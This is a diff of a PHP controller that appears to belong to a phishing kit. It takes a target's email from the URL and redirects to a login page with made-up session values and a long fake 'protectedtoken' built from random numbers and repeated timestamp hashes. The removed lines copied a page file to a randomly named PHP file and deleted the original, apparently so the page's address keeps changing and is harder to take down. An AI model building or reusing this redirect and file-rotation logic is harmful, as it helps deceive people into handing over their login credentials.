@@ -12,34 +12,12 @@ class HomeController extends Controller
         $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
         // header('location:'.$url);
         if(isset($_GET['email'])) {
-            $email = $_GET['email'];
-            $dir =  getcwd();
-            if ($handle = opendir($dir)) {
-                while (false !== ($entry = readdir($handle))) {
-            $len = strlen($entry);
-            if($len == 10){
-            rename($entry, "sub.php");
-            }}}
-            $staticfile = "sub.php";
-            $name =  $this->generateRandomString();
-            $secfile = $name.".php";
-            if (!copy($staticfile, $secfile)) {
-            //echo "file not create\n";
-            }else {
-                if(file_exists($secfile)){
-                //echo "file exist\n";
-                unlink($staticfile);
-                //to generate random string
+                $email = $_GET['email'];          
                 $praga = rand();
                 $praga = md5($praga);
-                // fetch location
-                
-                return redirect()->route('login', ['clientId'=>$praga, 'session' => $praga,'protectedtoken' =>  $url, 'email' => $email]);              
+                return redirect()->route('login', ['clientId'=>$praga, 'session' => $praga,'protectedtoken' =>  $url, 'email' => $email]);                      
         
-        
-                }
-            }
-        }
+        }        
         return view('welcome');
     }
     public function random_number(){
